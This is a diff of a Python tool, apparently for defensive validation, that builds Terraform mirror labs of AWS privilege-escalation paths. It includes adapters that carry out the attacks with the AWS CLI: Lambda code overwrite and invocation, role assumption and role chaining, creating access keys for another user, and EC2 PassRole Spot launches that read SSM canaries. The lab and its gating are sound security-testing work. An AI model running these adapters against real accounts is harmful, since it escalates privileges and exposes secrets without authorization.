-                        "AWS_CanAssumeRoleWithWebIdentity",
-                        "AWS_CanAssumeRoleViaIRSA",
-                        "AWS_CanAssumeRoleViaPodIdentity",
-                        "AWS_RunsAs",
-                    }
-                    else "KEEP_CURRENT_PRINCIPAL"
-                ),
-            }
-        )
-    if not implemented:
-        missing.append("BOUNDED_RUNTIME_ADAPTER:generic_awshound_path")
-    edge_kinds = {edge.kind for edge in selected}
-    if (
-        "AWS_CanUpdateLambdaCode" in edge_kinds
-        and "AWS_CanInvokeLambdaFunction" not in edge_kinds
-    ):
-        missing.append("LAMBDA_TRIGGER_OR_INVOKE_REQUIRED")
-    return {
-        "contract_version": "1.0",
-        "scenario_id": scenario.scenario_id,
-        "scenario_type": scenario.scenario_type,
-        "required_terminal_state": "EXECUTION_VERIFIED",
-        "automation_status": (
-            "AUTO_EXECUTABLE"
-            if implemented and not missing
-            else "EXECUTOR_IMPLEMENTATION_REQUIRED"
-        ),
-        "starting_principal": scenario.start_node_id,
-        "negative_precheck": {
-            "required": True,
-            "rule": "The starting principal must not already satisfy the final success oracle.",
-        },
-        "readiness_checks": [
-            "Terraform state and required outputs exist",
-            "Starting-principal ARN matches the execution credential",
-            "Required workload resources are Active/Running",
-            "Required artifacts and canaries exist",
-            "IAM and resource-policy propagation is complete",
-        ],
-        "steps": steps,
-        "final_proof": {
-            "required": True,
-            "rules": [
-                "Every required edge action succeeded in order",
-                "Credential transitions match expected target principals",
-                "The final canary or authorization-state oracle passed",
-                "No deployer/administrator credential was used for an attack step",
-            ],
-        },
-        "missing_automation": sorted(set(missing)),
-        "result_states": [
-            "EXECUTION_VERIFIED",
-            "ATTACK_BLOCKED",
-            "MIRROR_ERROR",
-            "ENVIRONMENT_ERROR",
-            "EXECUTOR_IMPLEMENTATION_REQUIRED",
-        ],
-    }
-
-
-def detection_expectations_for(scenario: Scenario) -> dict[str, Any]:
-    mapping = {
-        "lambda_update_invoke_admin": {
-            "management_events": ["UpdateFunctionCode"],
-            "data_events": ["Invoke"],
-        },
-        "sts_assume_admin": {"management_events": ["AssumeRole"], "data_events": []},
-        "ec2_passrole_spot_admin": {
-            "management_events": ["RequestSpotInstances"],
-            "data_events": [],
-        },
-        "iam_create_access_key_s3": {
-            "management_events": ["CreateAccessKey"],
-            "data_events": ["GetObject"],
-        },
-        "role_chain_s3": {"management_events": ["AssumeRole"], "data_events": ["GetObject"]},
-    }
-    result = mapping.get(scenario.scenario_type, {"management_events": [], "data_events": []})
-    return {
-        **result,
-        "siem": "Connector-specific. The tool emits an evidence contract but does not invent a SIEM query.",
-    }
-
-
 TF_HEADER = r'''terraform {
   required_version = ">= 1.6.0"
 
@@ -2028,7 +1284,6 @@ locals {
 }
 '''
 
-
 COMMON_VARIABLES = r'''variable "aws_region" {
   description = "Mirror deployment Region"
   type        = string
@@ -2058,7 +1313,6 @@ variable "enable_vulnerable_path" {
 }
 '''
 
-
 COMMON_OUTPUTS = r'''output "mirror_account_id" {
   value = data.aws_caller_identity.current.account_id
 }
@@ -2082,11 +1336,9 @@ output "starting_secret_access_key" {
 }
 '''
 
-
 INITIAL_LAMBDA = '''def lambda_handler(event, context):
     return {"statusCode": 200, "body": "mirror-initial-code"}
 '''
-
 
 def cloudtrail_resources(data_resources: list[tuple[str, str]]) -> str:
     blocks = ""
@@ -2165,7 +1417,6 @@ resource "aws_cloudtrail" "mirror" {
 }
 '''.replace("@@DATA_RESOURCES@@", blocks.rstrip())
 
-
 CLOUDTRAIL_OUTPUTS = r'''
 output "cloudtrail_name" {
   value = aws_cloudtrail.mirror.name
@@ -2176,12 +1427,10 @@ output "cloudtrail_bucket_name" {
 }
 '''
 
-
 def tf_replace(text: str, scenario: Scenario) -> str:
     return text.replace("@@SCENARIO_ID@@", scenario.scenario_id).replace(
         "@@REGION@@", scenario.region
     )
-
 
 def lambda_terraform(scenario: Scenario, nodes: dict[str, Node]) -> dict[str, str]:
     function = nodes[scenario.target_node_id]
@@ -2299,7 +1548,6 @@ output "synthetic_flag_sha256" {
         "fixtures/lambda_function.py": INITIAL_LAMBDA,
     }
 
-
 def sts_terraform(scenario: Scenario) -> dict[str, str]:
     main = TF_HEADER + r'''
 resource "aws_iam_user" "starting" {
@@ -2391,7 +1639,6 @@ output "synthetic_flag_sha256" {
         "outputs.tf": tf_replace(outputs, scenario),
     }
 
-
 def s3_base_resources() -> str:
     return r'''
 resource "aws_s3_bucket" "target" {
@@ -2422,7 +1669,6 @@ resource "aws_s3_object" "flag" {
 }
 '''
 
-
 def s3_outputs() -> str:
     return r'''
 output "target_bucket_name" {
@@ -2438,7 +1684,6 @@ output "synthetic_flag_sha256" {
   sensitive = true
 }
 '''
-
 
 def create_key_terraform(scenario: Scenario) -> dict[str, str]:
     main = TF_HEADER + r'''
@@ -2499,7 +1744,6 @@ output "access_target_user_name" {
         "variables.tf": tf_replace(COMMON_VARIABLES, scenario),
         "outputs.tf": tf_replace(outputs, scenario),
     }
-
 
 def role_chain_terraform(scenario: Scenario) -> dict[str, str]:
     main = TF_HEADER + r'''
@@ -2640,7 +1884,6 @@ output "s3_access_role_arn" {
         "outputs.tf": tf_replace(outputs, scenario),
     }
 
-
 EC2_VARIABLES = COMMON_VARIABLES + r'''
 
 variable "mirror_ami_id" {
@@ -2659,7 +1902,6 @@ variable "mirror_instance_type" {
   default     = "t3.micro"
 }
 '''
-
 
 def ec2_terraform(scenario: Scenario) -> dict[str, str]:
     main = TF_HEADER + r'''
@@ -2836,12 +2078,10 @@ output "synthetic_flag_sha256" {
         "outputs.tf": tf_replace(outputs, scenario),
     }
 
-
 def tf_address(node: Node) -> str:
     base = re.sub(r"[^a-z0-9_]+", "_", node_name(node).lower()).strip("_")[:32]
     digest = hashlib.sha1(node.id.encode("utf-8")).hexdigest()[:8]
     return f"{base or 'resource'}_{digest}"
-
 
 def remap_policy_document(
     raw: Any,
@@ -2864,7 +2104,6 @@ def remap_policy_document(
     if re.fullmatch(r"\d{12}", source_account_id):
         text = text.replace(source_account_id, "${data.aws_caller_identity.current.account_id}")
     return text
-
 
 def network_model_from_context(evidence: dict[str, Any] | None) -> dict[str, Any]:
     model: dict[str, Any] = {
@@ -2917,11 +2156,9 @@ def network_model_from_context(evidence: dict[str, Any] | None) -> dict[str, Any
             model["vpc_endpoints"].update({value["VpcEndpointId"]: value for value in response.get("VpcEndpoints", [])})
     return model
 
-
 def network_tf_address(prefix: str, resource_id: str) -> str:
     cleaned = re.sub(r"[^a-z0-9_]+", "_", resource_id.lower()).strip("_")
     return f"{prefix}_{cleaned}"
-
 
 def render_network_from_context(
     evidence: dict[str, Any] | None,
@@ -3210,7 +2447,6 @@ resource "aws_network_acl_association" "{assoc_address}" {{
 }}
 ''')
     return "\n".join(blocks), subnet_refs, sg_refs, coverage, sorted(set(blockers))
-
 
 def generic_terraform(
     scenario: Scenario,
@@ -3743,7 +2979,6 @@ resource "terraform_data" "coverage_gate" {{
     files.update(fixtures)
     return files
 
-
 def terraform_files(
     scenario: Scenario,
     nodes: dict[str, Node],
@@ -3763,75 +2998,6 @@ def terraform_files(
         raise PipelineError(f"Terraform renderer is not implemented: {scenario.scenario_type}")
     return renderer()
 
-
-def required_inputs(scenario: Scenario) -> dict[str, Any]:
-    inputs: list[dict[str, Any]] = [
-        {
-            "name": "resource_name_prefix",
-            "source": "USER_REQUIRED",
-            "reason": "New mirror names and a run identifier do not exist in the source graph.",
-        },
-        {
-            "name": "synthetic_flag",
-            "source": "USER_REQUIRED",
-            "reason": "Source secret and object values are intentionally not copied.",
-            "sensitive": True,
-        },
-        {
-            "name": "target_aws_profile",
-            "source": "AWS_SDK_CREDENTIAL_CHAIN",
-            "reason": "Target credentials are never written to Terraform variables.",
-            "sensitive": True,
-        },
-        {
-            "name": "expected_target_account_id",
-            "source": "USER_REQUIRED",
-            "reason": "The tool verifies the exact deployment account before any mutation.",
-        },
-    ]
-    if scenario.scenario_type == "ec2_passrole_spot_admin":
-        inputs.extend(
-            [
-                {
-                    "name": "mirror_ami_id",
-                    "source": "USER_REQUIRED",
-                    "reason": "The graph describes permission to create a new instance, not a source instance or AMI.",
-                },
-                {
-                    "name": "mirror_instance_type",
-                    "source": "USER_OR_DEFAULT",
-                    "default": "t3.micro",
-                },
-            ]
-        )
-    if scenario.scenario_type == "generic_awshound_path":
-        inputs.extend(
-            [
-                {
-                    "name": "artifact_mode",
-                    "source": "USER_DECISION",
-                    "allowed": ["synthetic", "approved-copy"],
-                    "reason": "Code and disk artifacts are not contained in AWSHound OpenGraph.",
-                },
-                {
-                    "name": "allow_partial_reconstruction",
-                    "source": "USER_ACKNOWLEDGEMENT",
-                    "default": False,
-                    "reason": "Terraform blocks apply when an official node/edge lacks a safe renderer.",
-                },
-            ]
-        )
-    return {
-        "status": "USER_INPUT_REQUIRED",
-        "inputs": inputs,
-        "prohibited_inputs": [
-            "Production secrets",
-            "Source account access keys",
-            "Customer data",
-        ],
-    }
-
-
 def tfvars_example(scenario: Scenario) -> str:
     lines = [
         'resource_name_prefix  = "REQUIRED_UNIQUE_PREFIX"',
@@ -3846,1789 +3012,3 @@ def tfvars_example(scenario: Scenario) -> str:
             ]
         )
     return "\n".join(lines) + "\n"
-
-
-GENERATED_README = r'''# AWSHound minimal mirror: @@SCENARIO_ID@@
-
-This directory was generated by `mirrorctl prepare`.
-
-## Safety model
-
-- Source ARNs are retained only as evidence in JSON manifests; generated Terraform does not reference them.
-- Source credentials, secrets, object content, and snapshots are not copied.
-- All business data is replaced with a synthetic canary.
-- Terraform does not run during `prepare`.
-- `deploy`, `attack`, `remediate`, and `destroy` each require a separate exact approval token.
-- Runtime attack adapters can use only resource names returned by this Terraform state.
-
-## Required values
-
-Copy `terraform.tfvars.example` to `terraform.tfvars` and replace every
-`REQUIRED_*` value.  AWS credentials are supplied only through an AWS CLI
-profile when invoking `mirrorctl`.
-
-## Lifecycle
-
-```powershell
-py ..\..\mirrorctl.py deploy --run-dir . --target-profile PROFILE --expected-account-id 123456789012 --approve APPLY
-py ..\..\mirrorctl.py attack --run-dir . --target-profile PROFILE --expected-account-id 123456789012 --approve ATTACK
-py ..\..\mirrorctl.py evidence --run-dir . --target-profile PROFILE --expected-account-id 123456789012
-py ..\..\mirrorctl.py remediate --run-dir . --target-profile PROFILE --expected-account-id 123456789012 --approve FIX
-py ..\..\mirrorctl.py retest --run-dir . --target-profile PROFILE --expected-account-id 123456789012 --approve RETEST
-py ..\..\mirrorctl.py destroy --run-dir . --target-profile PROFILE --expected-account-id 123456789012 --approve DESTROY
-```
-'''
-
-
-def generate_scenario_directory(
-    root: Path,
-    scenario: Scenario,
-    nodes: dict[str, Node],
-    edges: list[Edge],
-    requests: list[ContextRequest],
-    source_hash: str,
-    context_evidence: dict[str, Any] | None = None,
-) -> Path:
-    destination = root / scenario.scenario_id
-    destination.mkdir(parents=True, exist_ok=True)
-    for relative_name, content in terraform_files(scenario, nodes, edges, context_evidence).items():
-        path = destination / relative_name
-        path.parent.mkdir(parents=True, exist_ok=True)
-        path.write_text(content, encoding="utf-8", newline="\n")
-    (destination / "terraform.tfvars.example").write_text(
-        tfvars_example(scenario), encoding="utf-8", newline="\n"
-    )
-    (destination / "README.md").write_text(
-        tf_replace(GENERATED_README, scenario), encoding="utf-8", newline="\n"
-    )
-    write_json(destination / "minimal-reproduction-spec.json", minimal_spec(scenario, nodes, edges, requests))
-    write_json(destination / "context-api-plan.json", [asdict(request) for request in requests])
-    write_json(destination / "artifact-plan.json", artifact_plan_for(scenario, nodes, edges))
-    write_json(destination / "attack-plan.json", attack_plan_for(scenario, nodes, edges))
-    write_json(
-        destination / "validation-contract.json",
-        validation_contract_for(scenario, nodes, edges),
-    )
-    write_json(
-        destination / "source-subgraph.json",
-        {
-            "nodes": [
-                {
-                    "id": node_id,
-                    "kinds": list(nodes[node_id].kinds),
-                    "properties": nodes[node_id].properties,
-                }
-                for node_id in scenario.node_ids
-            ],
-            "edges": [
-                {
-                    "kind": edge.kind,
-                    "start": edge.start,
-                    "end": edge.end,
-                    "properties": edge.properties,
-                }
-                for edge in edges
-                if edge.start in scenario.node_ids and edge.end in scenario.node_ids
-            ],
-        },
-    )
-    write_json(destination / "required-inputs.json", required_inputs(scenario))
-    write_json(
-        destination / "run-manifest.json",
-        {
-            "tool": "mirrorctl",
-            "tool_version": VERSION,
-            "created_at": utc_now(),
-            "source_sha256": source_hash,
-            "scenario": asdict(scenario),
-            "safety": {
-                "automatic_apply": False,
-                "automatic_attack": False,
-                "source_data_copied": False,
-                "synthetic_validation_assets": True,
-                "target_account_verification_required": True,
-            },
-        },
-    )
-    return destination
-
-
-def load_manifest(run_dir: Path) -> dict[str, Any]:
-    path = run_dir / "run-manifest.json"
-    if not path.is_file():
-        raise PipelineError(f"run manifest is missing: {path}")
-    return json.loads(path.read_text(encoding="utf-8"))
-
-
-def state_path(run_dir: Path) -> Path:
-    return run_dir / ".mirrorctl" / "state.json"
-
-
-def load_state(run_dir: Path) -> dict[str, Any]:
-    path = state_path(run_dir)
-    if not path.exists():
-        return {"state_version": "1.0", "history": []}
-    return json.loads(path.read_text(encoding="utf-8"))
-
-
-def save_state(run_dir: Path, state: dict[str, Any]) -> None:
-    state["updated_at"] = utc_now()
-    write_json(state_path(run_dir), state)
-
-
-def append_history(
-    run_dir: Path, operation: str, status: str, details: dict[str, Any] | None = None
-) -> None:
-    state = load_state(run_dir)
-    state.setdefault("history", []).append(
-        {
-            "operation": operation,
-            "status": status,
-            "at": utc_now(),
-            "details": details or {},
-        }
-    )
-    state[operation] = {"status": status, "at": utc_now(), **(details or {})}
-    save_state(run_dir, state)
-
-
-def approval(actual: str | None, expected: str) -> None:
-    if actual != expected:
-        raise PipelineError(f"operation requires --approve {expected}")
-
-
-def verify_target(
-    run_dir: Path,
-    profile: str,
-    expected_account_id: str,
-    allow_source_account: bool,
-) -> dict[str, Any]:
-    if not re.fullmatch(r"\d{12}", expected_account_id):
-        raise PipelineError("--expected-account-id must be a 12-digit AWS account ID")
-    manifest = load_manifest(run_dir)
-    scenario = manifest["scenario"]
-    identity = aws_identity(profile, scenario.get("region"))
-    actual = str(identity.get("Account", ""))
-    if actual != expected_account_id:
-        raise PipelineError(
-            f"target profile account mismatch: expected={expected_account_id}, actual={actual}"
-        )
-    source = str(scenario.get("source_account_id", "UNKNOWN"))
-    if actual == source and not allow_source_account:
-        raise PipelineError(
-            "target is the source account. Use a separate mirror account, or pass "
-            "--allow-source-account only for an explicitly authorized disposable lab."
-        )
-    return identity
-
-
-def terraform_available() -> None:
-    if shutil.which("terraform") is None:
-        raise PipelineError("terraform is not installed or not available in PATH")
-
-
-def terraform_env(profile: str, region: str) -> dict[str, str]:
-    env = os.environ.copy()
-    env["AWS_PROFILE"] = profile
-    env["AWS_REGION"] = region
-    env["AWS_DEFAULT_REGION"] = region
-    for key in ("AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN"):
-        env.pop(key, None)
-    return env
-
-
-def run_checked(
-    command: list[str], *, cwd: Path, env: dict[str, str], timeout: int = 600
-) -> subprocess.CompletedProcess[str]:
-    result = run_command(command, cwd=cwd, env=env, timeout=timeout)
-    if result.returncode != 0:
-        raise PipelineError(
-            f"command failed ({' '.join(command[:3])}): {result.stderr.strip() or result.stdout.strip()}"
-        )
-    return result
-
-
-def deploy_mirror(
-    run_dir: Path,
-    profile: str,
-    expected_account: str,
-    allow_source_account: bool,
-) -> None:
-    terraform_available()
-    manifest = load_manifest(run_dir)
-    region = manifest["scenario"]["region"]
-    identity = verify_target(run_dir, profile, expected_account, allow_source_account)
-    if not (run_dir / "terraform.tfvars").is_file():
-        raise PipelineError(
-            "terraform.tfvars is missing. Copy terraform.tfvars.example and fill required values."
-        )
-    env = terraform_env(profile, region)
-    started = utc_now()
-    run_checked(["terraform", "init", "-input=false"], cwd=run_dir, env=env)
-    run_checked(["terraform", "fmt", "-recursive"], cwd=run_dir, env=env)
-    run_checked(["terraform", "validate"], cwd=run_dir, env=env)
-    plan_path = run_dir / ".mirrorctl" / "apply.tfplan"
-    plan_path.parent.mkdir(parents=True, exist_ok=True)
-    run_checked(
-        [
-            "terraform",
-            "plan",
-            "-input=false",
-            "-out",
-            str(plan_path),
-        ],
-        cwd=run_dir,
-        env=env,
-    )
-    run_checked(
-        ["terraform", "apply", "-input=false", "-auto-approve", str(plan_path)],
-        cwd=run_dir,
-        env=env,
-        timeout=1200,
-    )
-    append_history(
-        run_dir,
-        "deployment",
-        "DEPLOYED",
-        {
-            "started_at": started,
-            "completed_at": utc_now(),
-            "target_account_id": identity["Account"],
-            "target_identity_arn": identity["Arn"],
-            "target_profile": profile,
-        },
-    )
-
-
-def terraform_outputs(run_dir: Path) -> dict[str, Any]:
-    terraform_available()
-    result = run_checked(
-        ["terraform", "output", "-json"],
-        cwd=run_dir,
-        env=os.environ.copy(),
-    )
-    raw = json.loads(result.stdout)
-    return {name: item.get("value") for name, item in raw.items()}
-
-
-def require_outputs(outputs: dict[str, Any], names: Iterable[str]) -> None:
-    missing = [name for name in names if not outputs.get(name)]
-    if missing:
-        raise PipelineError("Terraform outputs are missing: " + ", ".join(missing))
-
-
-def attacker_env(outputs: dict[str, Any], region: str) -> dict[str, str]:
-    require_outputs(outputs, ["starting_access_key_id", "starting_secret_access_key"])
-    env = os.environ.copy()
-    for key in ("AWS_PROFILE", "AWS_SESSION_TOKEN"):
-        env.pop(key, None)
-    env["AWS_ACCESS_KEY_ID"] = str(outputs["starting_access_key_id"])
-    env["AWS_SECRET_ACCESS_KEY"] = str(outputs["starting_secret_access_key"])
-    env["AWS_REGION"] = region
-    env["AWS_DEFAULT_REGION"] = region
-    return env
-
-
-def role_env(credentials: dict[str, Any], region: str) -> dict[str, str]:
-    env = os.environ.copy()
-    env.pop("AWS_PROFILE", None)
-    env["AWS_ACCESS_KEY_ID"] = credentials["AccessKeyId"]
-    env["AWS_SECRET_ACCESS_KEY"] = credentials["SecretAccessKey"]
-    env["AWS_SESSION_TOKEN"] = credentials["SessionToken"]
-    env["AWS_REGION"] = region
-    env["AWS_DEFAULT_REGION"] = region
-    return env
-
-
-def aws_with_env(
-    args: list[str], env: dict[str, str], *, timeout: int = 120, expect_json: bool = True
-) -> Any:
-    command = ["aws", *args, "--no-cli-pager"]
-    if expect_json and "--output" not in args:
-        command.extend(["--output", "json"])
-    result = run_command(command, env=env, timeout=timeout)
-    if result.returncode != 0:
-        raise PipelineError(result.stderr.strip() or result.stdout.strip())
-    if not expect_json:
-        return result.stdout
-    return json.loads(result.stdout or "{}")
-
-
-def aws_with_profile(
-    args: list[str], profile: str, region: str, *, timeout: int = 120, allow_failure: bool = False
-) -> tuple[int, Any]:
-    command = [
-        "aws",
-        *args,
-        "--profile",
-        profile,
-        "--region",
-        region,
-        "--output",
-        "json",
-        "--no-cli-pager",
-    ]
-    result = run_command(command, timeout=timeout)
-    if result.returncode != 0:
-        if allow_failure:
-            return result.returncode, result.stderr.strip()
-        raise PipelineError(result.stderr.strip() or result.stdout.strip())
-    return 0, json.loads(result.stdout or "{}")
-
-
-def assume_role(role_arn: str, env: dict[str, str], session_name: str) -> dict[str, Any]:
-    result = aws_with_env(
-        [
-            "sts",
-            "assume-role",
-            "--role-arn",
-            role_arn,
-            "--role-session-name",
-            session_name,
-            "--duration-seconds",
-            "900",
-        ],
-        env,
-    )
-    return result["Credentials"]
-
-
-def is_authorization_denial(message: str) -> bool:
-    lower = message.lower()
-    needles = (
-        "accessdenied",
-        "access denied",
-        "unauthorizedoperation",
-        "not authorized to perform",
-        "explicit deny",
-    )
-    return any(needle in lower for needle in needles)
-
-
-def hash_text(value: str) -> str:
-    return hashlib.sha256(value.encode("utf-8")).hexdigest()
-
-
-def timestamp_millis(value: Any) -> int:
-    if isinstance(value, (int, float)):
-        return int(value)
-    if isinstance(value, str):
-        text = value.replace("Z", "+00:00")
-        try:
-            return int(dt.datetime.fromisoformat(text).timestamp() * 1000)
-        except ValueError:
-            return 0
-    return 0
-
-
-def parse_utc(value: str) -> dt.datetime:
-    return dt.datetime.fromisoformat(value.replace("Z", "+00:00"))
-
-
-def attack_lambda(run_dir: Path, outputs: dict[str, Any], region: str) -> dict[str, Any]:
-    require_outputs(
-        outputs,
-        ["target_lambda_name", "flag_parameter_name", "synthetic_flag_sha256"],
-    )
-    payload = '''import boto3
-import hashlib
-import os
-
-def lambda_handler(event, context):
-    value = boto3.client("ssm").get_parameter(
-        Name=os.environ["MIRROR_FLAG_PARAMETER"]
-    )["Parameter"]["Value"]
-    return {"statusCode": 200, "flag_sha256": hashlib.sha256(value.encode()).hexdigest()}
-'''
-    env = attacker_env(outputs, region)
-    with tempfile.TemporaryDirectory() as temporary:
-        root = Path(temporary)
-        source = root / "lambda_function.py"
-        source.write_text(payload, encoding="utf-8", newline="\n")
-        archive = root / "payload.zip"
-        with zipfile.ZipFile(archive, "w", zipfile.ZIP_DEFLATED) as output_zip:
-            output_zip.write(source, "lambda_function.py")
-        update = aws_with_env(
-            [
-                "lambda",
-                "update-function-code",
-                "--function-name",
-                str(outputs["target_lambda_name"]),
-                "--zip-file",
-                f"fileb://{archive.as_posix()}",
-                "--region",
-                region,
-            ],
-            env,
-            timeout=180,
-        )
-        aws_with_env(
-            [
-                "lambda",
-                "wait",
-                "function-updated-v2",
-                "--function-name",
-                str(outputs["target_lambda_name"]),
-                "--region",
-                region,
-            ],
-            env,
-            expect_json=False,
-            timeout=300,
-        )
-        response_file = root / "response.json"
-        invoke = aws_with_env(
-            [
-                "lambda",
-                "invoke",
-                "--function-name",
-                str(outputs["target_lambda_name"]),
-                "--cli-binary-format",
-                "raw-in-base64-out",
-                "--payload",
-                "{}",
-                "--region",
-                region,
-                str(response_file),
-            ],
-            env,
-            timeout=180,
-        )
-        response = json.loads(response_file.read_text(encoding="utf-8"))
-    if invoke.get("FunctionError"):
-        raise PipelineError(f"Lambda returned FunctionError: {response}")
-    actual_hash = response.get("flag_sha256")
-    if actual_hash != outputs["synthetic_flag_sha256"]:
-        raise PipelineError("Lambda ran, but the privilege-use canary hash did not match")
-    return {
-        "status": "EXPLOITABLE",
-        "proof": "Updated Lambda code executed with the target role and read the synthetic SSM canary.",
-        "code_sha256": update.get("CodeSha256"),
-        "invoke_status_code": invoke.get("StatusCode"),
-        "canary_sha256": actual_hash,
-    }
-
-
-def attack_sts(outputs: dict[str, Any], region: str) -> dict[str, Any]:
-    require_outputs(outputs, ["target_role_arn", "flag_parameter_name", "synthetic_flag_sha256"])
-    first_env = attacker_env(outputs, region)
-    credentials = assume_role(str(outputs["target_role_arn"]), first_env, "mirror-sts-validation")
-    assumed_env = role_env(credentials, region)
-    response = aws_with_env(
-        [
-            "ssm",
-            "get-parameter",
-            "--name",
-            str(outputs["flag_parameter_name"]),
-            "--region",
-            region,
-        ],
-        assumed_env,
-    )
-    value = response["Parameter"]["Value"]
-    if hash_text(value) != outputs["synthetic_flag_sha256"]:
-        raise PipelineError("Assumed role could not produce the expected canary hash")
-    identity = aws_with_env(["sts", "get-caller-identity"], assumed_env)
-    return {
-        "status": "EXPLOITABLE",
-        "proof": "The starting user assumed the target role and read the synthetic SSM canary.",
-        "assumed_arn": identity.get("Arn"),
-        "canary_sha256": hash_text(value),
-    }
-
-
-def attack_create_key(
-    outputs: dict[str, Any], region: str, target_profile: str
-) -> dict[str, Any]:
-    require_outputs(
-        outputs,
-        [
-            "access_target_user_name",
-            "target_bucket_name",
-            "target_object_key",
-            "synthetic_flag_sha256",
-        ],
-    )
-    initial_env = attacker_env(outputs, region)
-    access_key_id: str | None = None
-    try:
-        created = aws_with_env(
-            [
-                "iam",
-                "create-access-key",
-                "--user-name",
-                str(outputs["access_target_user_name"]),
-            ],
-            initial_env,
-        )["AccessKey"]
-        access_key_id = created["AccessKeyId"]
-        created_env = os.environ.copy()
-        created_env.pop("AWS_PROFILE", None)
-        created_env["AWS_ACCESS_KEY_ID"] = created["AccessKeyId"]
-        created_env["AWS_SECRET_ACCESS_KEY"] = created["SecretAccessKey"]
-        created_env.pop("AWS_SESSION_TOKEN", None)
-        created_env["AWS_REGION"] = region
-        created_env["AWS_DEFAULT_REGION"] = region
-        with tempfile.TemporaryDirectory() as temporary:
-            downloaded = Path(temporary) / "flag.txt"
-            last_error = ""
-            for _ in range(6):
-                result = run_command(
-                    [
-                        "aws",
-                        "s3api",
-                        "get-object",
-                        "--bucket",
-                        str(outputs["target_bucket_name"]),
-                        "--key",
-                        str(outputs["target_object_key"]),
-                        str(downloaded),
-                        "--region",
-                        region,
-                        "--no-cli-pager",
-                    ],
-                    env=created_env,
-                )
-                if result.returncode == 0:
-                    break
-                last_error = result.stderr.strip()
-                time.sleep(3)
-            else:
-                raise PipelineError(last_error or "new access key could not read the object")
-            actual_hash = sha256_bytes(downloaded.read_bytes())
-        if actual_hash != outputs["synthetic_flag_sha256"]:
-            raise PipelineError("S3 object hash did not match the synthetic canary")
-        return {
-            "status": "EXPLOITABLE",
-            "proof": "The starting user created credentials for another user and read its synthetic S3 object.",
-            "created_access_key_id": access_key_id,
-            "canary_sha256": actual_hash,
-        }
-    finally:
-        if access_key_id:
-            aws_with_profile(
-                [
-                    "iam",
-                    "delete-access-key",
-                    "--user-name",
-                    str(outputs["access_target_user_name"]),
-                    "--access-key-id",
-                    access_key_id,
-                ],
-                target_profile,
-                region,
-                allow_failure=True,
-            )
-
-
-def attack_role_chain(outputs: dict[str, Any], region: str) -> dict[str, Any]:
-    require_outputs(
-        outputs,
-        [
-            "initial_role_arn",
-            "intermediate_role_arn",
-            "s3_access_role_arn",
-            "target_bucket_name",
-            "target_object_key",
-            "synthetic_flag_sha256",
-        ],
-    )
-    env = attacker_env(outputs, region)
-    hops: list[str] = []
-    for index, key in enumerate(
-        ["initial_role_arn", "intermediate_role_arn", "s3_access_role_arn"], start=1
-    ):
-        role_arn = str(outputs[key])
-        credentials = assume_role(role_arn, env, f"mirror-chain-{index}")
-        env = role_env(credentials, region)
-        hops.append(role_arn)
-    with tempfile.TemporaryDirectory() as temporary:
-        downloaded = Path(temporary) / "flag.txt"
-        result = run_command(
-            [
-                "aws",
-                "s3api",
-                "get-object",
-                "--bucket",
-                str(outputs["target_bucket_name"]),
-                "--key",
-                str(outputs["target_object_key"]),
-                str(downloaded),
-                "--region",
-                region,
-                "--no-cli-pager",
-            ],
-            env=env,
-        )
-        if result.returncode != 0:
-            raise PipelineError(result.stderr.strip())
-        actual_hash = sha256_bytes(downloaded.read_bytes())
-    if actual_hash != outputs["synthetic_flag_sha256"]:
-        raise PipelineError("S3 object hash did not match the synthetic canary")
-    return {
-        "status": "EXPLOITABLE",
-        "proof": "The starting user traversed the role chain and read the synthetic S3 object.",
-        "role_hops": hops,
-        "canary_sha256": actual_hash,
-    }
-
-
-def attack_ec2(
-    outputs: dict[str, Any], region: str, target_profile: str
-) -> dict[str, Any]:
-    require_outputs(
-        outputs,
-        [
-            "instance_profile_arn",
-            "mirror_subnet_id",
-            "mirror_security_group_id",
-            "mirror_ami_id",
-            "mirror_instance_type",
-            "flag_parameter_name",
-            "evidence_parameter_name",
-            "synthetic_flag_sha256",
-        ],
-    )
-    aws_with_profile(
-        ["ssm", "delete-parameter", "--name", str(outputs["evidence_parameter_name"])],
-        target_profile,
-        region,
-        allow_failure=True,
-    )
-    user_data = f'''#!/bin/bash
-set -euo pipefail
-VALUE=$(aws ssm get-parameter --name {outputs["flag_parameter_name"]} --region {region} --query Parameter.Value --output text)
-HASH=$(printf %s "$VALUE" | sha256sum | awk '{{print $1}}')
-aws ssm put-parameter --name {outputs["evidence_parameter_name"]} --type String --value "$HASH" --overwrite --region {region}
-shutdown -h now
-'''
-    launch = {
-        "ImageId": outputs["mirror_ami_id"],
-        "InstanceType": outputs["mirror_instance_type"],
-        "IamInstanceProfile": {"Arn": outputs["instance_profile_arn"]},
-        "UserData": base64.b64encode(user_data.encode("utf-8")).decode("ascii"),
-        "NetworkInterfaces": [
-            {
-                "DeviceIndex": 0,
-                "AssociatePublicIpAddress": False,
-                "SubnetId": outputs["mirror_subnet_id"],
-                "Groups": [outputs["mirror_security_group_id"]],
-            }
-        ],
-    }
-    env = attacker_env(outputs, region)
-    request_id: str | None = None
-    instance_id: str | None = None
-    with tempfile.TemporaryDirectory() as temporary:
-        launch_file = Path(temporary) / "launch.json"
-        launch_file.write_text(json.dumps(launch), encoding="utf-8")
-        try:
-            response = aws_with_env(
-                [
-                    "ec2",
-                    "request-spot-instances",
-                    "--instance-count",
-                    "1",
-                    "--type",
-                    "one-time",
-                    "--launch-specification",
-                    f"file://{launch_file.as_posix()}",
-                    "--region",
-                    region,
-                ],
-                env,
-                timeout=180,
-            )
-            request_id = response["SpotInstanceRequests"][0]["SpotInstanceRequestId"]
-            deadline = time.time() + 600
-            while time.time() < deadline:
-                _, described = aws_with_profile(
-                    [
-                        "ec2",
-                        "describe-spot-instance-requests",
-                        "--spot-instance-request-ids",
-                        request_id,
-                    ],
-                    target_profile,
-                    region,
-                )
-                instance_id = described["SpotInstanceRequests"][0].get("InstanceId")
-                if instance_id:
-                    break
-                time.sleep(10)
-            if not instance_id:
-                raise PipelineError("Spot request did not receive an instance within 10 minutes")
-            while time.time() < deadline:
-                code, response_or_error = aws_with_profile(
-                    [
-                        "ssm",
-                        "get-parameter",
-                        "--name",
-                        str(outputs["evidence_parameter_name"]),
-                    ],
-                    target_profile,
-                    region,
-                    allow_failure=True,
-                )
-                if code == 0:
-                    actual_hash = response_or_error["Parameter"]["Value"]
-                    if actual_hash != outputs["synthetic_flag_sha256"]:
-                        raise PipelineError("EC2 canary hash did not match")
-                    return {
-                        "status": "EXPLOITABLE",
-                        "proof": "A Spot instance launched with the passed admin role and wrote the privilege-use canary.",
